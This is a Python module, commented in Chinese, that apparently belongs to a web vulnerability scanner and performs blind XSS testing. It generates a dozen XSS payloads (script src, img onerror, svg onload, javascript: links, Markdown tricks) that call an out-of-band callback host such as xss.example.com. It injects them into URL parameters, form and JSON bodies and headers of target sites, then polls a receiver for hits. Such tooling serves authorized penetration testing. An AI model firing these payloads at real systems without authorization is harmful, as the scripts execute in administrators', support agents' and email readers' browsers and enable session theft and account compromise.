"""
盲打 XSS（Blind XSS / OOB Callback）— P1 关键能力。

适用场景：
- 后台审核页（管理员私下查看用户提交，无前端回显但管理员浏览器执行）
- 邮件正文渲染（HTML 邮件客户端打开后执行）
- 客服 IM 后台（客服点击工单详情时执行）
- 日志查看页面（运维查看时执行）
- PDF/Word 报表渲染（服务端 headless 渲染时执行）

工作流：
1. 为每个写入型注入点配 callback payload，含独立 token
2. payload 形如：<script src="//xss.example.com/?t=TOKEN"></script>
3. callback URL 可选：
   a) 用户配置的公网回调（如 https://your-server/xss/{token}）
   b) Interactsh OOB DNS 服务（最推荐，免部署）
   c) 自建本地 webhook（本地测试用）
4. 提交 payload → 等候 60-300 秒（异步触发）
5. 轮询回调记录，命中 token 即确认存在盲打 XSS

设计：
- 与存储型追踪类似，但不依赖"读取页能爬到"
- 持久化 token → 写入点映射，便于后续匹配
- 不阻塞主流程：扔 payload 后立即返回 candidate（confidence 0.4），LLM 研判时标 needs_review
- 等回调后期再升级（实际实现：扫描结束前 sleep 一段时间轮询一次）

OOB 通道实现优先级：
- P1 阶段：仅 HTTP webhook（本地 + 公网两种模式）
- 后续：集成 Interactsh client（Go 的 SDK 我们不易用，可用 HTTP API）
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
import uuid
from typing import TYPE_CHECKING, Optional
from urllib.parse import urlparse

import httpx

from core.xss.models import (
    FindingStatus,
    InjectionPoint,
    InjectionTarget,
    Severity,
    XssCandidate,
    XssFinding,
    XssType,
)

if TYPE_CHECKING:
    from core.sitemap import Sitemap

log = logging.getLogger(__name__)


# ============================================================
# OOB Token 配置
# ============================================================
def _generate_oob_token() -> str:
    """生成全局唯一的 token，用于关联 callback 和注入点。"""
    return f"bxss{uuid.uuid4().hex[:16]}"


# ============================================================
# Blind XSS Payload 集
# ============================================================
def build_blind_payloads(callback_url: str, token: str) -> list[str]:
    """根据回调 URL 和 token 生成盲打 payload 集。

    callback_url 示例：https://xss.example.com/c  → 最终请求 https://xss.example.com/c?t=TOKEN
    或：oob.example.net  → 最终请求 https://TOKEN.oob.example.net/
    """
    # 拼接最终 URL
    if callback_url.startswith("http"):
        # HTTP 回调模式
        sep = "&" if "?" in callback_url else "?"
        cb_url = f"{callback_url}{sep}t={token}"
        # 注意：HTML 属性中需要单/双引号转义；payload 内的 URL 不含 ' " 是安全的
        return [
            f'<script src="{cb_url}"></script>',
            f'<img src=x onerror="fetch(\'{cb_url}\')">',
            f'<svg onload="fetch(\'{cb_url}\')">',
            f'"><script src="{cb_url}"></script>',
            f"<img src=x onerror=fetch('{cb_url}')>",
            # JS 上下文
            f';fetch("{cb_url}");//',
            f'");fetch("{cb_url}");//',
            # SVG/onload 不依赖 fetch
            f'<svg/onload="new Image().src=\'{cb_url}\'">',
            # 富文本场景
            f'<a href="javascript:fetch(\'{cb_url}\')">click</a>',
            # DOM 加载触发
            f'<iframe src="javascript:fetch(\'{cb_url}\')"></iframe>',
            # Markdown 渲染场景
            f'[click](javascript:fetch(\'{cb_url}\'))',
            f'![](x" onerror="fetch(\'{cb_url}\'))',
        ]
    else:
        # DNS-only 模式（Interactsh 风格）— 用 subdomain 标识 token
        sub_url = f"//{token}.{callback_url}"
        return [
            f'<script src="{sub_url}/x.js"></script>',
            f'<img src="{sub_url}/x.png">',
            f'<link rel=stylesheet href="{sub_url}/x.css">',
            f"<iframe src='{sub_url}'></iframe>",
            f'"><script src="{sub_url}/x.js"></script>',
            # JS fetch DNS
            f';fetch("{sub_url}");//',
        ]


# ============================================================
# OOB Listener — 简单 HTTP webhook 接收器
# ============================================================
class LocalOobReceiver:
    """本地 OOB 接收器（用于内网测试场景）。

    起一个简单 HTTP server 接收 callback，记录 token 命中。
    在 web/server.py 中可以挂载这个 endpoint。
    """

    def __init__(self):
        self._hits: dict[str, list[dict]] = {}  # token → 命中记录列表
        self._tokens: dict[str, dict] = {}  # token → meta（target/payload）
        self._lock = asyncio.Lock()

    def register_token(self, token: str, meta: dict):
        """注册一个 token 期待回调。"""
        self._tokens[token] = meta

    async def record_hit(self, token: str, hit_info: dict):
        """记录一次回调（来自 webhook）。"""
        async with self._lock:
            if token not in self._tokens:
                # 未知 token，仍记录（可能是历史扫描）
                pass
            self._hits.setdefault(token, []).append({
                **hit_info,
                "ts": time.time(),
            })

    async def get_hits(self, token: str) -> list[dict]:
        async with self._lock:
            return list(self._hits.get(token, []))

    async def get_all_hits(self) -> dict[str, list[dict]]:
        async with self._lock:
            return dict(self._hits)


# 全局单例（供 web/server.py 共享）
_global_receiver: Optional[LocalOobReceiver] = None


def get_global_oob_receiver() -> LocalOobReceiver:
    global _global_receiver
    if _global_receiver is None:
        _global_receiver = LocalOobReceiver()
    return _global_receiver


# ============================================================
# 盲打扫描器
# ============================================================
class BlindXssScanner:
    """盲打 XSS 扫描器 — 对写入点发 OOB payload，记录 token→target 映射。"""

    def __init__(
        self,
        callback_url: str,  # 用户配置的 OOB endpoint
        proxy: str = "",
        auth_headers: dict = None,
        cookies: dict = None,
        timeout: float = 15.0,
        on_progress: Optional[callable] = None,
        receiver: Optional[LocalOobReceiver] = None,
        wait_for_callback_seconds: int = 30,
    ):
        self.callback_url = callback_url
        self.proxy = proxy or None
        self.auth_headers = auth_headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.on_progress = on_progress
        self.receiver = receiver or get_global_oob_receiver()
        self.wait_for_callback_seconds = wait_for_callback_seconds
        # token → 注入点 meta
        self.token_map: dict[str, dict] = {}

    def _report(self, msg: str):
        if self.on_progress:
            try:
                self.on_progress(msg)
            except Exception:
                pass

    async def scan_write_points(
        self,
        write_targets: list[InjectionTarget],
        max_targets: int = 50,
        max_payloads_per_target: int = 3,
    ) -> list[XssCandidate]:
        """对写入点发盲打 payload，返回 pending 候选（等回调后升级）。"""
        if not write_targets or not self.callback_url:
            return []

        targets = write_targets[:max_targets]
        self._report(f"📡 Blind XSS 启动: {len(targets)} 个写入点, callback={self.callback_url}")

        candidates: list[XssCandidate] = []
        sem = asyncio.Semaphore(4)

        async with httpx.AsyncClient(
            proxy=self.proxy, timeout=self.timeout, verify=False,
            follow_redirects=False, headers=self.auth_headers, cookies=self.cookies,
            limits=httpx.Limits(max_connections=15),
        ) as client:

            async def _inject_one(tgt: InjectionTarget):
                async with sem:
                    try:
                        cands = await self._inject_blind(client, tgt, max_payloads_per_target)
                        candidates.extend(cands)
                    except Exception as e:
                        log.debug("blind inject error: %s", e)

            await asyncio.gather(*[_inject_one(t) for t in targets])

        self._report(f"  📤 已注入 {len(candidates)} 个盲打 payload, 等待 {self.wait_for_callback_seconds}s 回调...")

        # 等待回调
        await asyncio.sleep(self.wait_for_callback_seconds)

        # 检查回调命中
        hit_count = await self._check_callbacks(candidates)
        self._report(f"✅ Blind XSS 完成: {hit_count} 个 token 收到回调")

        return candidates

    async def _inject_blind(
        self,
        client: httpx.AsyncClient,
        tgt: InjectionTarget,
        max_payloads: int,
    ) -> list[XssCandidate]:
        """对一个写入点注入盲打 payload。"""
        out: list[XssCandidate] = []
        # 每个写入点用一个 token
        token = _generate_oob_token()
        payloads = build_blind_payloads(self.callback_url, token)[:max_payloads]

        # 注册 token
        self.receiver.register_token(token, {
            "target_url": tgt.url,
            "target_method": tgt.method,
            "param_name": tgt.param_name,
            "injection_point": tgt.injection_point.value,
            "ts": time.time(),
        })
        self.token_map[token] = {
            "target": tgt,
            "payloads": payloads,
        }

        for payload in payloads:
            try:
                await self._send_to_target(client, tgt, payload)
            except Exception:
                continue

        # 创建 pending 候选
        cand = XssCandidate(
            target=tgt,
            payload=payloads[0],
            marker=token,
            echo_matches=[],
            confidence=0.4,  # 待回调确认
            xss_type=XssType.BLIND,
            request_packet=f"[Blind XSS] {tgt.method} {tgt.url}\n"
                           f"参数: {tgt.param_name}\n"
                           f"已注入 {len(payloads)} 个 payload\n"
                           f"OOB token: {token}\n"
                           f"等待回调 URL: {self.callback_url}",
            response_packet=f"Token registered: {token}",
            response_status=0,
            scanner="xss_blind",
        )
        out.append(cand)
        return out

    async def _send_to_target(
        self, client: httpx.AsyncClient, tgt: InjectionTarget, payload: str
    ):
        """复用发送逻辑发盲打 payload。"""
        from core.xss.stored_tracker import StoredXssTracker
        # 借用 stored_tracker 的 _send_write 方法逻辑
        from urllib.parse import urlparse, parse_qsl, urlencode

        method = tgt.method.upper()
        headers = dict(tgt.headers or {})
        headers.pop("Content-Length", None)
        headers.pop("content-length", None)

        if tgt.injection_point == InjectionPoint.URL_PARAM:
            parsed = urlparse(tgt.url)
            existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
            existing[tgt.param_name] = payload
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(existing)}"
            await client.request(method, new_url, headers=headers)
            return
        if tgt.injection_point == InjectionPoint.BODY_FORM:
            await client.request(method, tgt.url, headers=headers,
                                 data={tgt.param_name: payload})
            return
        if tgt.injection_point == InjectionPoint.BODY_JSON:
            obj = {}
            try:
                if tgt.body_template:
                    obj = json.loads(tgt.body_template)
            except Exception:
                obj = {}
            if not isinstance(obj, dict):
                obj = {}
            obj[tgt.param_name] = payload
            headers.setdefault("Content-Type", "application/json")
            await client.request(method, tgt.url, headers=headers,
                                 content=json.dumps(obj))
            return
        if tgt.injection_point == InjectionPoint.HEADER:
            headers[tgt.param_name] = payload
            await client.request(method, tgt.url, headers=headers)
            return

    async def _check_callbacks(self, candidates: list[XssCandidate]) -> int:
        """检查每个 candidate 的 token 是否收到回调，命中则升级 confidence。"""
        hit_count = 0
        for cand in candidates:
            token = cand.marker
            hits = await self.receiver.get_hits(token)
            if hits:
                hit_count += 1
                cand.confidence = 0.95
                cand.browser_triggered = True
                cand.browser_evidence = (
                    f"OOB callback received ({len(hits)} hit(s)): "
                    f"{json.dumps(hits[0], ensure_ascii=False)[:300]}"
                )
        return hit_count
